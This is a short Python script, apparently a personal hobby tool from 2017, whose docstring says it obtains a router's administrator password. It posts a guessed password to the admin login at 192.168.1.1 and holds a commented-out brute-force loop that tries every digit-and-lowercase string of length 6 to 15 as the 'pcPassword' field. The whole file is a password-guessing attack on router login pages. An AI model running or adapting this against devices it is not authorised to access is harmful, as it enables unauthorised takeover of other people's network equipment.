'''
Created on 2017年9月30日

@author: zheng

获取路由器的管理员密码
'''
from Tools.MySpider import MySpider
import requests
import string
import itertools as its
from Tools import MyHeader

class RouterManagePassSpider(MySpider):
    def __init__(self):
        MySpider.__init__(self, 'http://192.168.1.1/')
        
    def tryPass(self):
#         words = "1234567890" + string.ascii_lowercase 
        self.postdata = {
                "pcPassword":'111111',
                }
        page = requests.post(self.start_url, self.postdata)
        print(page.cookies)
        page = requests.get(self.start_url, cookies=page.cookies)
#         for n in range(6, 16):
#             r = its.product(words, repeat=n)
#             for i in r:
#                 i = "".join(i)
#                 self.postdata = {
#                 "pcPassword":i,
#                 }
#                 print(i)
#                 page = requests.post(self.start_url, data=self.postdata)
#                 print(page.text)
#                 if page.status_code != 200:
#                     return

if __name__ == "__main__":
    t = RouterManagePassSpider()
    t.tryPass()
